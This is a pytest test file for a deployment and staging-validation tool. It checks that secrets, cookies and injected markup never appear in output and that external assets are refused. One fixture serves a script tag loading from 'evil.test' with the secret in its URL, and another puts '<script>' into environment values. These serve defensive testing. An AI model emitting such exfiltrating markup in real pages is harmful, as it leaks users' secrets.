from pathlib import Path
from types import SimpleNamespace

import httpx
import pytest

from deploy import actions_vps as deploy
from deploy.actions_summary import summary
from vasa import staging_validation as staging
from vasa.config import Settings

SECRET = "private-key-cookie-csrf-html-never-print"
HTML = (
    '<link rel="stylesheet" href="/dashboard/assets/styles.css">'
    '<script src="/dashboard/assets/login.js"></script>'
)


@pytest.mark.parametrize(
    "failure", [None, "login", "dashboard", "asset", "license", "external_asset"]
)
async def test_web_checks_privacy_boundaries_and_failures(failure, capsys):
    requested = []

    def handle(request):
        requested.append(str(request.url))
        path = request.url.path
        if path == "/login":
            return httpx.Response(
                500 if failure == "login" else 200,
                headers={"content-type": "text/html", "set-cookie": "vasa_session=" + SECRET},
                text=HTML
                + (
                    f'<script src="https://evil.test/{SECRET}"></script>'
                    if failure == "external_asset"
                    else SECRET
                ),
            )
        if path == "/dashboard":
            assert "cookie" not in request.headers
            return httpx.Response(200 if failure == "dashboard" else 401, text=SECRET)
        if path.startswith("/dashboard/assets/"):
            return httpx.Response(404 if failure == "asset" else 200, text=SECRET)
        if path == "/server/ok":
            return httpx.Response(200, json={"status": "ok"})
        if path == "/license/status":
            return httpx.Response(
                200, json={"status": SECRET if failure == "license" else "active"}
            )
        pytest.fail("Unexpected request")

    async with httpx.AsyncClient(transport=httpx.MockTransport(handle)) as client:
        if failure:
            with pytest.raises(ValueError):
                await staging.web_checks(Settings(_env_file=None), client)
        else:
            await staging.web_checks(Settings(_env_file=None), client)
    output = capsys.readouterr()
    assert SECRET not in output.out + output.err
    assert not any("evil.test" in url for url in requested)
    if failure is None:
        assert "STAGING_DASHBOARD_AUTH_OK" in output.out


async def test_response_limit():
    async with httpx.AsyncClient(
        transport=httpx.MockTransport(lambda r: httpx.Response(200, content=b"x" * 65537))
    ) as client:
        with pytest.raises(ValueError, match="limit"):
            await staging.get(client, "http://127.0.0.1/login")


def test_cli_never_prints_exception_or_secret(monkeypatch, capsys):
    async def fail():
        staging.stage("instances")
        raise RuntimeError(SECRET)

    monkeypatch.setattr(staging, "validate", fail)
    assert staging.main() == 1
    assert capsys.readouterr().out == "STAGING_VALIDATION_FAILED=instances\n"


@pytest.mark.parametrize("malicious", [False, True])
def test_summary_contains_only_five_fixed_fields(malicious):
    env = {
        "VASA_TRIGGER": "push",
        "VASA_TARGET_SHA": "a" * 40,
        "VASA_RESOLVED_MODE": "deploy",
        "VASA_SMOKE": "false",
        "VASA_RESULT": "success",
        "DEEPGRAM_API_KEY": SECRET,
    }
    if malicious:
        env.update({key: SECRET + "\n<script>" for key in env if key.startswith("VASA_")})
    result = summary(env)
    assert len(result.splitlines()) == 5
    assert SECRET not in result and "<script>" not in result
    if not malicious:
        assert "Mode: deploy" in result and "Provider smoke: false" in result


@pytest.mark.parametrize("failed", [False, True])
def test_controller_filters_validation_output_even_nonzero(tmp_path, monkeypatch, capsys, failed):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts/sanitize_call_diagnostics.py").write_text("#fixture")
    monkeypatch.setattr(deploy, "ROOT", tmp_path)
    monkeypatch.setattr(deploy, "git", lambda *a: "a" * 40)
    monkeypatch.setattr(deploy, "run", lambda *a, **k: "CALL_MEDIA=receive_recovered")
    monkeypatch.setattr(deploy, "host_web_checks", lambda: None)
    markers = staging.MARKERS if not failed else {"STAGING_VALIDATION_FAILED=instances"}
    monkeypatch.setattr(
        deploy,
        "compose",
        lambda *a, **k: SimpleNamespace(
            returncode=int(failed), stdout="\n".join([*markers, SECRET]), stderr=SECRET
        ),
    )
    if failed:
        with pytest.raises(deploy.Refusal):
            deploy.post_validation("a" * 40)
    else:
        deploy.post_validation("a" * 40)
    output = capsys.readouterr().out
    assert SECRET not in output
    assert ("STAGING_VALIDATION_FAILED=instances" in output) == failed


def test_push_uses_normal_deploy_and_no_paid_smoke():
    workflow = Path(".github/workflows/vasa-vps-deploy.yml").read_text()
    assert "push:\n    branches:\n      - build/vasa-foundation" in workflow
    assert "github.event_name == 'push' && 'deploy' || inputs.mode" in workflow
    assert "github.event_name == 'workflow_dispatch' && inputs.provider_smoke" in workflow
    assert workflow.count("bash deploy/actions-ssh.sh") == 1
    assert "cancel-in-progress: false" in workflow


def test_staging_capture_cannot_run_other_compose_commands():
    with pytest.raises(deploy.Refusal):
        deploy.compose("up", "postgres", capture_validation=True)
